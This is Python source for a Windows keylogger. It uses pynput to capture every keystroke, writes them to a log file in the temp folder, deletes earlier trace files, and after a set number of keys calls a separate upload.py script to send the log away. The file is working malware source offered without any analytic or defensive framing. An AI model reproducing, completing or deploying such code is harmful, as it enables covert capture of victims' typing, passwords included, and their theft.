import os
import sys
import tempfile
import time
import shutil
from pynput.keyboard import Key
from pynput.keyboard import Listener

argv = 0
the_keys = []
if os.path.exists(f"{tempfile.gettempdir()}\\between.bat") == True:
    os.system(f"del /q {tempfile.gettempdir()}\\between.bat")
if os.path.exists(f"{tempfile.gettempdir()}\\keylog-output") == True:
    shutil.rmtree(f"{tempfile.gettempdir()}\\keylog-output") 
os.mkdir(f"{tempfile.gettempdir()}\\keylog-output")
def functionPerKey(key):
    global argv
    argv = argv + 1
    the_keys.append(key)
    storeKeysToFile(the_keys)
def storeKeysToFile(keys):
    with open(f"{tempfile.gettempdir()}\\keylog-output\\keylog-output.txt", "w") as log:
        for the_key in keys:
            global argv
            the_key = str(the_key).replace("Key.space", " ")
            the_key = str(the_key).replace("Key.enter", "\n")
            the_key = str(the_key).replace("Key.shift", "<shift>")
            the_key = str(the_key).replace("Key.shift_r", "<shift>")
            the_key = str(the_key).replace("Key.ctrl_l", "<ctrl>")
            the_key = str(the_key).replace("Key.alt_gr", "<alt_gr>")
            the_key = str(the_key).replace("Key.caps_lock", "<caps_lock>")
            the_key = str(the_key).replace("Key.cmdnote", "<win>")
            the_key = str(the_key).replace("Key.backspace", "<backspace>")
            the_key = str(the_key).replace("'", "")
            log.write(the_key)
    if argv == int(sys.argv[1]):
        os.system("move %tmp%\\keylog-output\\keylog-output.txt %tmp%\\")
        time.sleep(2)
        os.system(f"del /q {tempfile.gettempdir()}\\keylog.sw")
        os.system(f"python {os.path.dirname(os.path.realpath(__file__))}\\upload.py keylog-output.txt")
        exit()
def onEachKeyRelease(the_key):
    if the_key == Key.esc:
        return False
with Listener(  
    on_press = functionPerKey,  
    on_release = onEachKeyRelease  
) as the_listener:  
    the_listener.join()  